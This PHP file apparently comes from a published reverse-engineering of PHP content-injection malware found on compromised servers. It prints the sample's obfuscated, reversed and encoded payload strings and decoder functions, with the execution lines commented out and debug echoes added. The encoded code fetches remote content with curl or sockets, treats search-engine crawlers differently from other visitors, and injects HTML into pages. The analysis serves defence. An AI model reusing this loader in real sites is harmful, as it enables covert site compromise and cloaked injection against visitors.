<?php

/**
 * This is a This is a reverse-engineering of malicious code found in
 * compromised servers. "REVENGNOTE" is used for comments that are not
 * in the original code.
 *
 * @see        https://github.com/alligo/Reverse-Engineering-PHP-Malware-Content-injection
 * @author     Bernardo Donadio <emerson at alligo.com.br>
 * @author     Emerson Rocha Luiz <emerson at alligo.com.br>
 * @copyright  Copyright (C) 2016 Alligo Ltda. Some rights reserved.
 * @license    See LICENSE
 */

/** REVENGNOTE: next code was added to make this file work. Was present on last step **/
$siv = "\x73\164\x72\137\x72\145\x70\154\x61\143\x65";  /** REVENGNOTE: str_replace **/

/** REVENGNOTE: next code was added to make this file work. Was present on last step **/
$slv = "\x73\164\x72\162\x65\166";  /** REVENGNOTE: strrev **/

/** REVENGNOTE: next code was added to make this file work. Was present on last step **/
$s1v="\x63\162\x65\141\x74\145\x5f\146\x75\156\x63\164\x69\157\x6e"; /** REVENGNOTE: create_function **/

/** REVENGNOTE: next code was added to make this file work. Was present on last step **/
$svv = '//}9;g$^s$9nruter9}9;)8,0,q$(r$=.g$9;))"46\27x\36\56x\26\77x\16\17x\".q$.g$(m$,"*H"(p$9=9q$9{9))s$(l$<)g$(l$(9elihw9;""9=9g$9;"53x\441\d6x\"=m$;"261\47x\361\26x\561\37x\"=r$;"351\36x\141\07x\"=p$;"651\56x\451\27x\461\37x\"=l$9{9)q$9,s$(2ne9noitcnuf;}';

/** REVENGNOTE: next code was added to make this file work. Was present on last step **/
$n9 = '1067|416|779|223|361';

/** REVENGNOTE: next code was added to make this file work. Was present on last step **/
$v9 = '5656}5;Bv5;oc$v5Y5;-4_g@&oc$5;oc$v5Y5;-3_g@&oc$5;oc$v5Y5;-2_g@&oc$5;oc$v5Y5;-1_g@&oc$5;B&oc$5{5-6dtz55}56;%v5;)%6,"n\r\n\r\"(edolpxe&)%6,m$(tsil5;~v5)BV%(6fi5;)J(esolcW@5}5;t$6=.6%5{6))000016,J(daerW&t$(6elihw5;B&%5;)qer$6,J(etirwW5;"n\n\X$6:tsoH"6=.6qer$5;"n\0.1/PTTH6iru$6TEG"&qer$5}5;~v5;)J(esolcW@5{6))086,1pi$6,J(tcennocW@!(6fi5;)PCT_LOS6,MAERTS_KCOS6,TENI_FA(etaercW@&J5;~v5)2pi$6=!61pi$(6fi5;))1pi$(gnol2pi@(pi2gnol@&2pi$5;)X$(emanybXteg@&1pi$5;]"yreuq"[p$6.6"?"6.6]"htap"[p$&iru$5;B=]"yreuq"[p$6))]"yreuq"[p$(tessi!(fi5;]"X"[p$&X$5;-lru_esrap@6=p$5;~v5)~^)"etaercWj4_z55}5;%v5;~v5)BV%(6fi5;)cni$6,B(edolpmi@&%5;-elif@&cni$5;~v5)~^)"elifj3_z5}5;ser$v5;~v5)BVser$(6fi5;)hc$(esolcQ5;)hc$(cexeQ&ser$5;)06,REDAEH+5;)016,TUOEMIT+5;)16,REFSNARTNRUTER+5;)lru$6,LRU+5;)(tiniQ&hc$5;~v5)~^)"tiniQj2_z555}5;%v5;~v5)BV%(6fi5;-Z@&%5;~v5)~^)"Zj1_z59 |6: |5:""|B: == |V:tsoh|X:stnetnoc_teg_elif|Z:kcos$|J:_tekcos|W:_lruc|Q:)lru$(|-:_TPOLRUC ,hc$(tpotes_lruc|+:tpotes_lruc|*: = |&: === |^:fub$|%:eslaf|~: nruter|v:)~ ==! oc$( fi|Y:g noitcnuf|z:"(stsixe_noitcnuf( fi { )lru$(|j}}};eslaf nruter {esle };))8-,i$,ataDzg$(rtsbus(etalfnizg@ nruter };2+i$=i$ )2 & glf$ ( fi ;1+)i$ ,"0\",ataDzg$(soprts=i$ )61 & glf$( fi ;1+)i$,"0\",ataDzg$(soprts=i$ )8 & glf$( fi };nelx$+2+i$=i$ ;))2,i$,ataDzg$(rtsbus,"v"(kcapnu=)nelx$(tsil { )4 & glf$( fi { )0>glf$( fi ;))1,3,ataDzg$(rtsbus(dro=glf$ ;01=i$ { )"80x\b8x\f1x\"==)3,0,ataDzg$(rtsbus( fi { )ataDzg$(izgmoc noitcnuf { ))"izgmoc"(stsixe_noitcnuf!( fi|0} ;1o$~ } ;"" = 1o$Y;]1[1a$ = 1o$ )2=>)1a$(foezis( fi ;)1ac$,"0FN!"(edolpxe@=1a$ ;)po$,)-$(dtg@(2ne=1ac$ ;4g$."/".)"moc."(qqc."//:ptth"=-$ ;)))e&+)d&+)c&+)b&+)a&(edocne-(edocne-."?".po$=4g$ ;)999999,000001(dnar_tm=po$ {Y} ;"" = 1o$ { ) )))a$(rewolotrts ,"i/" . ))"relbmar*xednay*revihcra_ai*tobnsm*pruls*elgoog"(yarra ,"|"(edolpmi . "/"(hctam_gerp( ro )"nimda",)e$(rewolotrts(soprrtsQd$(Qc$(Qa$(( fi ;)"bc1afd45*88275b5e*8e4c7059*8359bd33"(yarra = rramod^FLES_PHP%e^TSOH_PTTH%d^RDDA_ETOMER%c^REREFER_PTTH%b^TNEGA_RESU_PTTH%a$ { )(212yadj } ;a$~ ;W=a$Y;"non"=a$ )""==W( fiY;"non"=a$ ))W(tessi!(fi { )marap$(212kcehcj } ;))po$ ,txet$(2ne(edocne_46esab~ { )txet&j9 esle |Y:]marap$[REVRES_$|W: ro )"non"==|Q:lru|-:.".".|+:","|*:$,po$(43k|&:$ ;)"|^:"(212kcehc=|%: nruter|~: noitcnuf|j}}8zc$9nruter9}817==!9eslaf28)45@9=979{96"5"(stsixe_328164sserpmocnuzg08164izgmoc08164etalfnizg09{9)llun9=9htgnel$9,4oocd939{9))"oocd"(stsixe_3!2| * ;*zd$*) )*edocedzg*zc$(*noitcnuf*( fi*zd$ nruter ) *@ = zd$( ==! eslaf( fi;)"j"(trats_boU~~~~;t$U&zesleU~;)W%Y%RzesleU~;)W@Y@RU;)v$(oocd=t$U;"54+36Q14+c6Q06+56Q26+".p$=T;"05+36Q46+16Q55+".p$=1p$;"f5Q74+56Q26+07Q"=p$U;)"enonU:gnidocnE-tnetnoC"(redaeHz)v$(jUwz))"j"(stsixe_w!k9 |U:2p$|T:x\|Q:1\|+:nruter|&:lmth|%:ydob|@:} |~: { |z:(fi|k:22ap|j:noitcnuf|w:/\<\(/"(T &z))t$,"is/|Y:/\<\/"(1p$k|R:1,t$ ,"1"."$"."n\".)(212yad ,"is/)>\*]>\^[|W';

function oo2($b)
{
    $h = explode("|", strrev($b));
    $d = explode("*", $h[0]);
    $b = $h[1];
    for ($i = 0; $i < sizeof($d); $i++) {
        $b = str_replace($i, $d[$i], $b);
    }

	/** REVENGNOTE: next code was not on this step, but was added to make it run or debug **/
	echo PHP_EOL. '>> function oo2($b): resultado   ' . print_r("};" . $b . "//", true) . PHP_EOL;

    /** REVENGNOTE: next lines was commented to disable run the source. Original have it enabled **/
    //create_function("", "};" . $b . "//");
}

function cqq($qw)
{
    $domarr = array(
        "33db9538",
        "9507c4e8",
        "e5b57288",
        "54dfa1cb"
    );
    return random($domarr, $qw);
}

function oo1($y)
{
    $y = strrev($y);
    $g = substr($y, strpos($y, "9") + 1);
    $v = explode(":", substr($y, 0, strpos($y, "9")));
    for ($i = 0; $i < sizeof($v); $i++) {
        $q = explode("|", $v[$i]);
        $g = str_replace($q[0], $q[1], $g);
    }

    /** REVENGNOTE: next code was not on this step, but was added to make it run or debug **/
	echo PHP_EOL . '>> function oo1($b): resultado   ' . print_r("};" . $g . "//", true) . PHP_EOL;

    /** REVENGNOTE: next lines was commented to disable run the source. Original have it enabled **/
    //create_function("", "};" . $g . "//");
}


/** REVENGNOTE: next code was not on this step, but was added to make it run or debug **/
echo '$s1v:' . print_r($s1v, true) . PHP_EOL; // create_function
echo '$siv:' . print_r($siv, true) . PHP_EOL; // str_replace
echo '$slv:' . print_r($slv, true) . PHP_EOL; // strrev


/** REVENGNOTE: next lines was commented to disable run the source. Original have it enabled **/
//$s1v("", $siv("\71", " ", $slv($svv))); /** REVENGNOTE:create_function("", str_replace("\71", " ", strrev($svv))); */

/** REVENGNOTE: next code was not on this step, but was added to make it run or debug **/
echo '$siv("\71", " ", $slv($svv)):' . print_r($siv("\71", " ", $slv($svv)), true) . PHP_EOL;


/** REVENGNOTE: nnext step file have contents of the last eval call on this file **/